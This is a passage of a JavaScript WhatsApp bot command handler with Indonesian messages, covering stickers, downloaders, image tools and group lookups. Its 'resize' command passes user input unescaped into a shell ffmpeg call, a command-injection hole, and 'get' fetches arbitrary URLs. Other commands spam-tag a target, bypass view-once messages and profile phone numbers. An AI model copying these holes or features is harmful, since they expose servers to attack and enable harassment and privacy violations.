sourceUrl: `${global.channel}`,
thumbnail: ppnyauser
}
}}, { quoted: m })
} catch (error) {
  return Xerror()
}
}
break
            
        case 'toimage': case 'toimg': {
if (isBan) return Xban()
await xreaction()
if (!quoted) ReplyRynzz('Reply Image')
if (!/webp/.test(mime)) ReplyRynzz(`Balas sticker dengan caption *${XyrooRynzz}*`)
let media = await Alice.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
let buffer = fs.readFileSync(ran)
Alice.sendMessage(from, { image: buffer }, {quoted: m})
fs.unlinkSync(ran)
})
}
break

 case 'toptv':
  case 'ptv':
{
if (isBan) return Xban()
await xreaction()
 if (!quoted) return ReplyRynzz('Reply video')
 if (!m.quoted) ReplyRynzz(`Balas Video Dengan Caption ${XyrooRynzz}`)
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted: m})
Alice.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break

case 'rvo':
case 'readvo':
case 'readviewonce': {
    if (!m.quoted) return ReplyRynzz('Kutip pesan view-once!')
    let msg = m.quoted
    let type = msg.mtype
    if (!msg.viewOnce) return ReplyRynzz('Itu bukan pesan view-once!')
    await xreaction()

    let media = await downloadContentFromMessage(
        msg, 
        type === 'imageMessage' ? 'image' : 
        type === 'videoMessage' ? 'video' : 'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    let sendOptions = { quoted: m }
    if (/video/.test(type)) {
        return Alice.sendMessage(m.chat, { video: buffer, caption: msg.caption || '' }, sendOptions)
    } else if (/image/.test(type)) {
        return Alice.sendMessage(m.chat, { image: buffer, caption: msg.caption || '' }, sendOptions)
    } else if (/audio/.test(type)) {
        return Alice.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }, sendOptions)
    }
}
break

case 'tourl': {
if (isBan) return Xban()
await xreaction()
    await xreaction(); // Mengirim pesan 'wait' sementara proses berlangsung

    try {
        // Mengunduh dan menyimpan media dari pesan
        let media = await Alice.downloadAndSaveMediaMessage(qmsg);

        // Mengecek apakah tipe media adalah gambar, video, atau audio
        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            let url = await uploadToCatbox(media);
            ReplyRynzz(`${url}\nExpired: No Expired Date`);
        } else {
            ReplyRynzz(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }

        // Menghapus file setelah diunggah
        await fs.unlinkSync(media);
    } catch (err) {
        ReplyRynzz(`Error: ${err.message}`);
    }
}
break
case 'wm': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('text wm?')
await xreaction()
if (/image/.test(mime)) {
let media = await Alice.downloadMediaMessage(quoted)
let encmedia = await Alice.sendImageAsSticker(m.chat, media, m, { packname: `${text}`, author: ``  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ReplyRynzz('Maksimal 10 detik!')
let media = await Alice.downloadMediaMessage(qmsg)
let encmedia = await Alice.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return ReplyRynzz(`Kirim Gambar/Video Dengan Caption ${XyrooRynzz}\nDurasi Video 1-9 Detik`)
}
}
break

case 'sticker':
case 'stiker':
case 's':{
if (isBan) return Xban()
await xreaction()
if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
if (!quoted) return ReplyRynzz(`Balas Video/Image Dengan Caption ${XyrooRynzz}`)
await xreaction()
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Alice.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 31) return ReplyRynzz('Maksimal 30 detik!')
let media = await quoted.download()
let encmedia = await Alice.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return ReplyRynzz(`Kirim Gambar/Video Dengan Caption ${XyrooRynzz}\nDurasi Video 1-9 Detik`)
}
uselimit()
ReplyRynzz(  Xlimit() )
}
break

case 'smeme': {
if (isBan) return Xban()
await xreaction()
  if (quoted) {
    let msg = quoted
    let type = Object.keys(msg)[0]
    if (msg[type].viewOnce && /image/.test(type)) {
      let media = await downloadContentFromMessage(msg[type], 'image')
      let buffer = Buffer.from([])
      for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
      }

      let awal = text.split('|')[0] || ''
      let akhir = text.split('|')[1] || ''
      const tempFile = `./temp_${Date.now()}.jpg`
      await fs.writeFileSync(tempFile, buffer)

    const { Smeme } = require('./AliceSystem/AliceScraper/smeme')
      let hasil = await Smeme(awal, akhir, tempFile)

      await Alice.sendImageAsSticker(m.chat, hasil, xy, {
      packname: `${pushname}`,
      author: `${author}`
      })

      await fs.unlinkSync(tempFile)
      return
    }
  }

  if (!/webp/.test(mime) && /image/.test(mime)) {
    let awal = text.split('|')[0] || ''
    let akhir = text.split('|')[1] || ''
    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
    
    const { Smeme } = require('./AliceSystem/AliceScraper/smeme')
    let hasil = await Smeme(awal, akhir, mee)

    await Alice.sendImageAsSticker(m.chat, hasil, xy, {
      packname: `${pushname}`,
      author: `${author}`
    })
    await fs.unlinkSync(mee)
  } else {
    ReplyRynzz(`Kirim/kutip gambar dengan caption ${XyrooRynzz} memek|xyroo`)
  }
}
break

case 'hd': 
case 'hdr':
case 'remini':
case 'enchanced': {
if (isBan) return Xban()
await xreaction()
if (!isImage) return ReplyRynzz(`Balas/Reply ${XyrooRynzz} Dengan Mengirim Gambar`)
 try {
 let media = await Alice.downloadAndSaveMediaMessage(quoted);
 let scale = await pxpic.create(media, 'upscale')
 let final = scale.resultImageUrl
await Alice.sendMessage(m.chat, { image: { url: final }, caption: `${packname}` }, { quoted: m})
} catch (error) {
  console.log(error)
  return ReplyRynzz('error')
 }
}
break
            
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Convert Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Tools Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'texttonote': {
  if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Example : ${XyrooRynzz} Nama|Kelas|Mata Pelajaran|Tanggal|Isi Catatan`)
  let [name, classroom, subject, date, ...content] = text.split('|')
  if (!name || !classroom || !subject || !date || content.length == 0) {
    return ReplyRynzz(`Format salah!\nContoh:\n${XyrooRynzz} Xyroo|XII - Bio A|Sexual Organs|2025-01-25|Isi catatan...`)
  }

  let contentEncoded = encodeURIComponent(content.join('|').trim())
  let url = `https://fastrestapis.fasturl.cloud/tool/texttonote?name=${encodeURIComponent(name)}&classroom=${encodeURIComponent(classroom)}&subject=${encodeURIComponent(subject)}&date=${encodeURIComponent(date)}&content=${contentEncoded}`

  try {
    await Alice.sendMessage(m.chat, {
      image: { url },
      caption: `Catatan untuk ${subject} berhasil dibuat!`
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    ReplyRynzz('Gagal membuat catatan, pastikan format dan isi valid.')
  }
}
  break
  case 'removebg' : {
if (isBan) return Xban()
await xreaction()
    if (!m.quoted || !m.quoted.download) {
        return ReplyRynzz(`Balas sebuah gambar dengan perintah *${XyrooRynzz}* untuk menghapus background.`);
    }

async function removebg(buffer) {
    try {
        return await new Promise(async (resolve, reject) => {
            const image = buffer.toString("base64");
            let res = await axios.post(
                "https://us-central1-ai-apps-prod.cloudfunctions.net/restorePhoto", {
                    image: `data:image/png;base64,${image}`,
                    model: "fb8af171cfa1616ddcf1242c093f9c46bcada5ad4cf6f2fbe8b81b330ec5c003",
                },
            );
            const data = res.data?.replace(`"`, "");
            console.log(res.status, data);
            if (!data) return reject("failed removebg image");
            resolve(data);
        });
    } catch (e) {
        return {
            msg: e
        };
    }
}

    try {
        const buffer = await m.quoted.download();
        const result = await removebg(buffer);

        if (typeof result === 'string') {
            await Alice.sendMessage(m.chat, { image: { url: result }, caption: "Berhasil menghapus latar belakang!" }, { quoted: m });
        } else {
            return ReplyRynzz(`${result.msg}`) || "Gagal menghapus latar belakang.";
        }
    } catch (err) {
        console.error(err);
       return ReplyRynzz(`Terjadi kesalahan: ${err.msg || err}`);
    }
};
break

case 'wastalk' : {
if (isBan) return Xban()
await xreaction()
let regionNames = new Intl.DisplayNames(['en'], { type: 'region' })
	let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	if (!num) return ReplyRynzz(`*• Example:* ${XyrooRynzz} *[Number]*`)
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await Alice.onWhatsApp(num))[0]?.exists) return ReplyRynzz('User not exists')
	let img = await Alice.profilePictureUrl(num, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png')
	let bio = await Alice.fetchStatus(num).catch(_ => { })
	let name = await Alice.getName(num)
	let business = await Alice.getBusinessProfile(num)
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `*[ WhatsApp Stalk ]*\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `*[ WhatsApp Business Stalk ]*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Descripcion* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
	img ? await Alice.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : ReplyRynzz(wea)
}
break

case'ceklinkgc':{
if (isBan) return Xban()
await xreaction()
    const iidgc = budy.match('@g.us')
    if(!iidgc)return ReplyRynzz(`Sertakan IdGroup Dengan Benar\nExample : ${XyrooRynzz} 120.......@g.us`)
    try{
    const gc = "https://chat.whatsapp.com/" + await Alice.groupInviteCode(text)
await ReplyRynzz(`${gc}`)
        }catch(e){
            ReplyRynzz('IdGroup Tidak Valid!!')
        }
}
break
case'nulis':{
if (isBan) return Xban()
await xreaction()
    if(!text)return ReplyRynzz(`Sertakan Text!!\nExample : ${XyrooRynzz} haloo bagaimana hari ini`)
    Alice.sendMessage(m.chat,{image:{url:`https://api.siputzx.my.id/api/m/nulis?text=${encodeURIComponent(text)}&name=${pushname}&position=center`}},{quoted: m})
}
break
case 'codegen': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`*Contoh penggunaan:*\n${XyrooRynzz} Fungsi untuk menghitung luas segitiga|Python`)

  let [prompt, language] = text.split("|").map(v => v.trim());

  if (!prompt || !language) {
    return ReplyRynzz(
      `*Format salah!*\nGunakan format seperti ini:\n` +
      `.${XyrooRynzz} <prompt>|<bahasa>\n\n` +
      `Contoh:\n.${XyrooRynzz} Cek bilangan prima|JavaScript`
    );
  }

  try {
    const payload = {
      customInstructions: prompt,
      outputLang: language
    };

    const { data } = await axios.post("https://www.codeconvert.ai/api/generate-code", payload);

    if (!data || typeof data !== "string") {
      return ReplyRynzz("Gagal mengambil hasil dari API.");
    }

    ReplyRynzz(
      `*Kode Hasil (${language}):*\n` +
      "```" + language.toLowerCase() + "\n" +
      data.trim() +
      "\n```"
    );

  } catch (error) {
    console.error(error);
    ReplyRynzz("Terjadi kesalahan saat memproses permintaan.");
  }
};
break
case 'spamtag': {
if (isBan) return Xban()
await xreaction()
  if (!m.isGroup) return ReplyRynzz('Perintah ini hanya bisa digunakan di dalam grup!')
  if (!text.includes('|')) return ReplyRynzz('Format salah!\nGunakan: .spamtag 628xxx/@tag|jumlah|pesan')

  let [targetRaw, jumlahRaw, ...pesanArray] = text.split('|')
  let jumlah = parseInt(jumlahRaw.trim())
  let pesan = pesanArray.join('|').trim()

  if (!targetRaw || isNaN(jumlah) || jumlah < 1 || !pesan)
    return ReplyRynzz('Format salah!\nGunakan: .spamtag 628xxx/@tag|jumlah|pesan')

  let target = targetRaw.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  const chatId = m.chat

  // Inisialisasi kalau belum ada
  if (!Alice.spamStatus) Alice.spamStatus = {}
  Alice.spamStatus[chatId] = true

  for (let i = 1; i <= jumlah; i++) {
    if (!Alice.spamStatus[chatId]) break
    await Alice.sendMessage(chatId, {
      text: `[#${i}] ${pesan}\n@${target.split('@')[0]}`,
      mentions: [target]
    }, { quoted: m })
    await new Promise(res => setTimeout(res, 1000))
  }

  delete Alice.spamStatus[chatId]
}
break

case 'stopspam': {
if (isBan) return Xban()
await xreaction()
  if (!m.isGroup) return ReplyRynzz('Perintah ini hanya bisa digunakan di dalam grup!')
  if (!Alice.spamStatus) Alice.spamStatus = {}

  const chatId = m.chat
  if (Alice.spamStatus[chatId]) {
    delete Alice.spamStatus[chatId]
    ReplyRynzz('Spam tag berhasil dihentikan!')
  } else {
    ReplyRynzz('Tidak ada spam tag yang sedang berjalan.')
  }
}
break

case 'txt2pixel' : {
    if (!text) return ReplyRynzz(`Mencari apa?\n\nContoh : ${prefix + command} a girl`)
    await xreaction()
    let j = await txt2.pixel(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

case 'txt2ghibli' : {
    if (!text) return ReplyRynzz(`Prompt?\n\nContoh : ${prefix + command} a girl`)
    await xreaction()
    let j = await txt2.ghibli(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

case 'txt2anime' : {
    if (!text) return ReplyRynzz(`Prompt?\n\nContoh : ${prefix + command} a girl`)
    await xreaction()
    let j = await txt2.anime(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

            case "tocode": {
                if (!text && !m.quoted) return reply(`\nreply something, then enter the file name, example: ${prefix + command} yaya\n`);
                let fullFileName = `c-${text}.js`;
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);

                const HeaderType = {
                    UNKNOWN: 0,
                    EMPTY: 1,
                    TEXT: 2,
                    DOCUMENT: 3,
                    IMAGE: 4,
                    VIDEO: 5,
                    LOCATION: 6
                };

                const ButtonType = {
                    UNKNOWN: 0,
                    RESPONSE: 1,
                    NATIVE_FLOW: 2
                };
                
                let result;
                if (quotedType === 'liveLocationMessage') {
                    result = ` 
let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, {
    viewOnceMessage: {
      message: ${penis}
    }
  }, {})
}

handler.help = ["c${text}"]
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`;
                } else if (quotedType === 'buttonsMessage') {
                    let buttonsMessage = {};
                    let headerType = HeaderType.UNKNOWN;
                    let buttonType = ButtonType.RESPONSE;
                    result = `
let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, {
    viewOnceMessage: {
      message: ${penis}
    }
  }, {})
}

handler.help = ["c${text}"]
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`;
                } else {
                    result = `

let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, ${penis}, {})
}

handler.help = ['c${text}']
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`
}
                function convertToNumbers(message) {
                    if (message?.buttonsMessage) {
                        message.buttonsMessage.headerType = HeaderType[message.buttonsMessage.headerType] || HeaderType.UNKNOWN;
                        if (message.buttonsMessage.buttons) {
                            message.buttonsMessage.buttons = message.buttonsMessage.buttons.map(button => {
                                button.type = ButtonType[button.type] || ButtonType.RESPONSE;
                                return button;
                            });
                        }
                    }
                    return message;
                }
      
                const message = JSON.parse(penis);
                const convertedMessage = convertToNumbers(message);
                let updatedPenis = JSON.stringify({ [quotedType]: convertedMessage[quotedType] }, null, 2);
                
                if (!fs.existsSync('./AlicePlugins')) {
                    fs.mkdirSync('./AlicePlugins');
                }
                
                fs.writeFileSync(`./AlicePlugins/${fullFileName}`, result.trim().replace(penis, updatedPenis));
                reply(`file ${fullFileName} successfully created in plugins folder`);
            }
            break;

            case "reactch": { 
if (isBan) return Xban()
await xreaction()
                if (!text) return ReplyRynzz(`${XyrooRynzz} < ch url > 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return ReplyRynzz("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return ReplyRynzz("ID chat tidak ditemukan dalam link yang diberikan.");
                Alice.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return ReplyRynzz("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    Alice.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
                ReplyRynzz(`sukses mengirimkan custom reaction ke channel tersebut`)
            }
            break;

			case 'getinfogc':
            case 'cekidgc':
			case 'getinfogrup':
			case 'getgc': {
if (isBan) return Xban()
await xreaction()
				if (!text) return ReplyRynzz(`${XyrooRynzz} Url Group`)
				if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return ReplyRynzz('tidak terdeteksi')
				try {
					let result = args[0].split('https://chat.whatsapp.com/')[1]
					let inpo = await Alice.groupGetInviteInfo(result)
					let teks = `
* ID: ${inpo.id}
* name: ${inpo.subject}
* owner: ${inpo.owner}
* kirim Pesan: ${inpo.announce ? 'Hanya Admin' : "Semua Orang"}
* persetujuan admin: ${inpo.joinApprovalMode ? 'Yes' : "No"}
* member Add mode: ${inpo.memberAddMode ? 'Yes' : "No"}
* deskripsi: ${inpo.desc}`				
					let button = [
                        {
                            name: "cta_copy",
					        buttonParamsJson: JSON.stringify({
                                display_text: "ID Group",
                                id: `${inpo.id}`,
                                copy_code: `${inpo.id}`
                            })
					    }
                    ]
					Alice.sendInteractive(m.chat, button, null, packname, teks, m)
				} catch (error) {
					Xerror()
				}
			}
			break
			case 'inspect':
            case 'cekidch':
			case 'getch':
			case 'getinfoch':
			case 'getchid': {
if (isBan) return Xban()
await xreaction()
				if (!text) return ReplyRynzz(`${XyrooRynzz} Url Channel WhatsApp`)
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return ReplyRynzz('tidak valid')

				function formatDate(timestamp) {
					const date = new Date(timestamp * 1000);
					const months = [
						'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
						'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
					];
					const day = date.getDate();
					const month = months[date.getMonth()];
					const year = date.getFullYear();
					return `${day} ${month} ${year}`;
				}
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1]
					let data = await Alice.newsletterMetadata("invite", result)
					let teks = `
* name: ${data.name}
* ID: ${data.id}
* status: ${data.state}
* dibuat Pada: ${formatDate(data.creation_time)}
* subscribers: ${data.subscribers}
* meta Verify: ${data.verification}
* react emoji: ${data.reaction_codes}
* description: ${data.description}`
					let button = [
                        {
                            name: "cta_copy",
					        buttonParamsJson: JSON.stringify({
                                display_text: "ID Channelnya",
                                id: `${data.id}`,
                                copy_code: `${data.id}`
                            })
					    }
                    ]
					Alice.sendInteractive(m.chat, button, null, packname, teks, xy)
				} catch (error) {
					Xerror()
				}
			}
			break
		
case 'stext':
case 'sharetext':
case 'sharetxt' : {
    if (!text) ReplyRynzz('Kasih teks yang mau dishare dong...')

const bikinLink = async (teks) => {
    const {
        data
    } = await axios.post('https://sharetext.io/api/text', {
        text: teks
    }, {
        headers: {
            'User-Agent': 'Mozilla/5.0',
            'Referer': 'https://sharetext.io/'
        }
    });

    if (!data) throw 'Gagal bikin link';
    return `https://sharetext.io/${data}`;
};


    try {
        const link = await bikinLink(text);
        await ReplyRynzz(`Nih link teks lu: ${link}`);
    } catch (e) {
        await ReplyRynzz(`Waduh error: ${e}`);
    }
};
break

case 'ccgen': {
  let [type, jumlah] = args;
  if (!type || !jumlah) return ReplyRynzz(
    `Contoh:\n${Xyroo}ccgen Visa 5\n\nTipe:\n- Visa\n- MasterCard\n- American Express\n- JCB\n\nJumlah: 5 - 20`
  );

  let allowed = ['Visa', 'MasterCard', 'American Express', 'JCB'];
  if (!allowed.includes(type)) return ReplyRynzz(`Tipe tidak valid:\n${allowed.join('\n')}`);

  let num = parseInt(jumlah);
  if (isNaN(num)) return ReplyRynzz('Jumlah harus angka');
  if (num < 5 || num > 20) return ReplyRynzz('Jumlah kartu harus 5-20');

  try {
    let { data } = await axios.get(`https://backend.lambdatest.com/api/dev-tools/credit-card-generator?type=${encodeURIComponent(type)}&no-of-cards=${num}`);
    if (!Array.isArray(data) || !data.length) return ReplyRynzz('Gagal dapat data');

    let teks = `*Generated ${type} Credit Cards (${num}) :*\n\n` + data.map((v, i) =>
      `*${i + 1}.* ${v.name}\n• Number : ${v.number}\n• CVV : ${v.cvv}\n• Expired : ${v.expiry}\n`
    ).join('\n');

    ReplyRynzz(teks.trim());
  } catch (e) {
    console.error(e);
    ReplyRynzz('Error, coba lagi nanti');
  }
}
break
case 'py':
case 'python': {
  if (!q) return ReplyRynzz(`Masukkan input`);
  if (q.length > 600) return ReplyRynzz(`Maksimal 600 Karakter`);

  try {
    const result = await Python(q);
    if (!result) {
      return ReplyRynzz("invalid server");
    }
    await ReplyRynzz(`${packname}\n\n${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    ReplyRynzz("invalid server");
  }
}
break

case 'js':
case 'javascript': {
  if (!q) return ReplyRynzz(`Masukkan input`);
  if (q.length > 600) return ReplyRynzz(`Maksimal 600 Karakter`);

  try {
    const result = await JavaScript(q);
    if (!result) {
      return ReplyRynzz("invalid server");
    }
    await ReplyRynzz(`${packname}\n\n${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    ReplyRynzz("invalid server");
  }
}
break

case 'html': {
  if (!q) return ReplyRynzz(`Masukkan input`);
    if (q.length > 600) return ReplyRynzz(`Maksimal 600 Karakter`);

  try {
    const result = await Html(q);
    if (!result) {
      return ReplyRynzz("invalid server");
    }
    await ReplyRynzz(`${packname}\n\n${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    ReplyRynzz("invalid server");
  }
}
break

case 'topcmd': {
if (isBan) return Xban()
await xreaction()  
  let data = Object.entries(global.topcmd)
      .sort((a, b) => b[1] - a[1]) // Urutkan Dari Yang Paling Banyak Dipakai
      .slice(0, 10) // Ambil 10 Teratas
      .map(([cmd, count], index) => `${index + 1}. *${cmd} - ${count}x*`)
      .join('\n');

  if (!data) data = "Tidak Ada Data";

  let teks = `Fitur Paling Sering Digunakan\n\n${data}`;
  Alice.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break

case 'resize': {
if (isBan) return Xban()
await xreaction()
  if (!args[0]) return ReplyRynzz(`Contoh ${XyrooRynzz} 300x300\nPanjangxlebar`)
  
  let panjang = q.split('x')[0]
  let lebar = q.split('x')[1]
  
  let media = await Alice.downloadAndSaveMediaMessage(quoted);
  let ran = getRandom('.jpeg')

  const command = `ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`
  
  exec(command, async (err) => {
    fs.unlinkSync(media)

    try {
      let buffer453 = fs.readFileSync(ran)
      await Alice.sendMessage(
        m.chat, 
        {
          mimetype: 'image/jpeg',
          image: buffer453
        }, 
        { quoted: m }
      );
    } catch (readError) {
      return ReplyRynzz('Terjadi kesalahan: '+readError)
    } finally {
      fs.unlinkSync(ran)
    }
  })
}
break

case 'diffusion':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('Apa yang ingin kamu buat?')
await Alice.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}}) 
    try {
 Alice.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
ReplyRynzz('eror')
    }
}
break

case 'delete': case 'del': case 'd':{
if (isBan) return Xban()
await xreaction()
if (!isAdmins) return Xadmin()
            	 let key = {}
             try {
               	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
            	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
            	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
             	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
         } catch (e) {
 	console.error(e)
 }
 Alice.sendMessage(m.chat, { delete: key })
}
break

case 'get': {
if (isBan) return Xban()
await xreaction()
  if (!/^https?:\/\//.test(text))
  return ReplyRynzz("Awali *URL* dengan http:// atau https://");
  const ajg = await fetch(text);
  if (ajg.headers.get("content-length") > 100 * 1024 * 1024 * 1024) {
    throw `Content-Length: ${ajg.headers.get("content-length")}`;
  }
  const contentType = ajg.headers.get("content-type");
  if (contentType.startsWith("image/")) {
    return Alice.sendMessage(m.chat, { image: { url: text } });
  }
  if (contentType.startsWith("video/")) {
    return Alice.sendMessage(m.chat, { video: { url: text } });
  }
  if (contentType.startsWith("audio/")) {
    return Alice.sendMessage(m.chat, { audio: { url: text }, mimetype: "audio/mpeg"  });
  }
  let alak = await ajg.buffer();
  try {
    alak = util.format(JSON.parse(alak + ""));
  } catch (e) {
    alak = alak + "";
  } finally {
    ReplyRynzz(alak.slice(0, 65536));
  }
}
break
case "kalkulator":{
if (isBan) return Xban()
await xreaction()
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
ReplyRynzz(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
ReplyRynzz(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
ReplyRynzz(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
ReplyRynzz(`${nilai_one / nilai_two}`)
} else ReplyRynzz(`*Example* : ${XyrooRynzz} 1 + 1`)
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Tools Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Downloader Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'duoyin':
  case 'duoyindl': {
 if (isBan) return Xban()
await xreaction()
  const url = args[0]
  if (!url) return ReplyRynzz(`Contoh: ${XyrooRynzz} https://v.douyin.com/iPHW24DE/`)

const douyin = async (url) => {
  const apiUrl = "https://lovetik.app/api/ajaxSearch"
  const formBody = new URLSearchParams()
  formBody.append("q", url)
  formBody.append("lang", "id")

  const res = await fetch(apiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "Accept": "*/*",
      "X-Requested-With": "XMLHttpRequest"
    },
    body: formBody.toString()
  })

  const data = await res.json()
  if (data.status !== "ok") throw "Gagal mengambil data Douyin."

  const $ = cheerio.load(data.data)
  const title = $("h3").text()
  const thumbnail = $(".image-tik img").attr("src")
  const duration = $(".content p").text()
  const dl = []

  $(".dl-action a").each((i, el) => {
    dl.push({
      text: $(el).text().trim(),
      url: $(el).attr("href")
    })
  })

  return { title, thumbnail, duration, dl }
}

  try {
    const result = await douyin(url)
    const caption = `*Judul:* ${result.title}\n*Durasi:* ${result.duration}`

    const video = result.dl.find(v => /mp4/i.test(v.text))
    const audio = result.dl.find(v => /mp3/i.test(v.text))

    if (video) {
      await Alice.sendMessage(m.chat, {
        video: { url: video.url },
        caption
      }, { quoted: m })
    }

    if (audio) {
      await Alice.sendMessage(m.chat, {
        audio: { url: audio.url },
        mimetype: 'audio/mp4'
      }, { quoted: m })
    }

    if (!video && !audio) {
      ReplyRynzz('Tidak ditemukan link video atau audio.')
    }
  } catch (e) {
    console.error(e)
    ReplyRynzz('Gagal mengunduh video Douyin. Pastikan link valid.')
  }
}
break
case 'twitter': case 'twitterdl': case 'x': case 'xdl': {
if (isBan) return Xban()
await xreaction()
if (!text.includes('x.com')) return ReplyRynzz(`• *Example :* ${XyrooRynzz} https://x.com/xxxx`)
await xreaction()
try {
async function twitterDl(link) {
  try {
    const token = await axios.post('https://x2twitter.com/api/userverify', 'url=' + link)
    const data = qs.stringify({
      q: link,
      lang: 'en',
      cftoken: token.data.token
    })

    const html = await axios.post('https://x2twitter.com/api/ajaxSearch', data, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })

    const $ = cheerio.load(html.data.data)
    let result = {}

    if ($('.tw-video').length > 0) {
      result.type = 'video'
      result.title = $('.clearfix h3').text().trim()
      result.duration = $('.clearfix p').text().trim()
      result.thumbnail = $('.image-tw img').attr('src')
      result.download = []

      $('.dl-action a').each((_, el) => {
        const quality = $(el).text().trim()
